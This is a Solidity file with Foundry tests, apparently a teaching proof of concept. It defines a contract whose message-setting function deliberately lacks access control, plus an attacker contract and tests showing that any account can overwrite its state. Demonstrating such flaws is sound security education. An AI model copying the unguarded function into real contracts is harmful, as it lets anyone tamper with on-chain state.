pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Vulnerable contract that permits cross channel invocation
contract VulnerableContract {
    // Public state variable storing the last received message
    string public lastMessage;

    // Vulnerable function: does not verify the source of invocation
    function updateMessage(string memory _message) public {
        // Lack of verification allows malicious invocation from any channel
        lastMessage = _message;
    }

    // Fallback receive function to receive Ether
    receive() external payable {}
}

// Attacker contract that exploits the vulnerability
contract Attacker {
    VulnerableContract public target;

    // Constructor expects the target's address as payable
    constructor(address payable _target) {
        target = VulnerableContract(_target);
    }

    // Attack function: calls updateMessage on VulnerableContract
    function attack() public {
        target.updateMessage("Attacked via Cross Channel Invocation");
    }
}

// Forge Foundry test contract to demonstrate the cross channel invocation vulnerability.
contract VulnerabilityTest is Test {
    VulnerableContract public vulnerable;
    Attacker public attacker;

    function setUp() public {
        // Deploy the vulnerable contract
        vulnerable = new VulnerableContract();
        
        // Deploy the attacker contract passing the vulnerable contract address as payable
        attacker = new Attacker(payable(address(vulnerable)));
    }

    // Test to confirm that the vulnerability can be exploited via cross channel invocation
    function testCrossChannelInvocation() public {
        // Pre-condition: Ensure the initial lastMessage is empty
        string memory initialMessage = vulnerable.lastMessage();
        assertEq(initialMessage, "", "Initial message should be empty");

        // Execute the attack via the Attacker contract
        attacker.attack();

        // Verify that the attacker's message has overwritten the previous state
        string memory finalMessage = vulnerable.lastMessage();
        assertEq(finalMessage, "Attacked via Cross Channel Invocation", "Attack should successfully modify lastMessage");
    }

    // Additional test demonstrating that even when called from any arbitrary account, the vulnerable function executes
    function testDirectCallByUnauthorizedAccount() public {
        // Simulate a direct call from an unauthorized account
        // Note: Using vm.prank to simulate msg.sender not being the trusted channel
        vm.prank(address(0xBEEF));
        vulnerable.updateMessage("Direct unauthorized call");

        // Verify that the state variable was changed
        string memory directCallMessage = vulnerable.lastMessage();
        assertEq(directCallMessage, "Direct unauthorized call", "Direct call should modify lastMessage");
    }
}
